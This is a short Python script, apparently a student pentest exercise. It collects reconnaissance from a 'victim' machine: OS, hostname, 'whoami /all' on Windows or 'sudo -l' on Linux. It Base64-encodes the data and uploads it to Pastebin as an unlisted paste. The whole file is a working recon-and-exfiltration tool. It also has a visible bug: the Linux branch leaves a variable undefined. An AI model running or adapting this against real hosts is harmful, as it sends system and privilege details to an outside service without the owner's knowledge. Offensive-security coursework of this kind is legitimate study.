# Juan Matthew - 2301852253

# Refrensi :
# https://www.w3resource.com/python-exercises/python-basic-exercise-43.php
# https://www.pythonpool.com.dream.website/get-hostname-python/
# https://www.kite.com/python/docs/subprocess.check_output
# https://stackoverflow.com/questions/11248224/python-subprocess-popen-result-stored-in-a-variable


from http.client import responses
from platform import system, platform
import requests
import base64
import sys
from subprocess import PIPE, Popen, check_output
import socket

# Deklarasi URL Pastebin dan Developer API Key 
API_URL = "https://pastebin.com/api/api_post.php"
API_KEY = "<DEVELOPER_API_KEY>"

# Mengambil OS, Hostname ,user, group, dan privileges yang digunakan oleh victim
# OS yang digunakan 
result_recon = f"Victim's OS: {platform()}\n\n"

if system() == "Windows":
    # Hostname
    host = (socket.gethostname())

    # user, group, dan privileges
    user_info_1 = check_output("whoami").strip().decode('utf-8')
    user_info_2 = check_output("whoami /all").strip().decode('utf-8')
    
elif system() == "Linux":
    # Hostname
    host = (socket.gethostname())
    
    # user, group, dan privileges
    user_info_1 = check_output("sudo -l").strip().decode('utf-8')

result = result_recon + host + user_info_1 + user_info_2
print(result)

# Melakukan encode Base64 kepada result
result_base = base64.b64encode(result.encode())
print("\n Hasil Base64 Encode\n")
print(result_base)
print("\n")

# Body Request yang akan dikirimkan ke API Endpoint
data = {
    'api_dev_key': API_KEY, # memasukan API key Developer
    'api_option': 'paste', # set Paste untuk memasukan data baru ke dalam pastebin
    'api_paste_private': 1, # set pastebin ke dalam unlisted
    'api_paste_name' : "ProgPentest_Pastebin", # nama pastebin yang digunakan
    'api_paste_code': result_base # memasukan message ke dalam pastebin
}

# Mengirimkan request menggunakan method POST dan menampilkan link pastebin
resp = requests.post(url=API_URL, data=data)
pastebin_url = resp.text
# jika upload gagal
if resp.status_code != 200:
    print(f"Response Code :{resp.status_code}")
    print("[!] Create Paste Failed")
    print(f"[!] Error: {resp.text}")
# jika upload berhasil
else:
    print(f"Response Code :{resp.status_code}")
    print("[*] Create Paste Success")
    print(f"[*] Pastebin URL: {resp.text}")
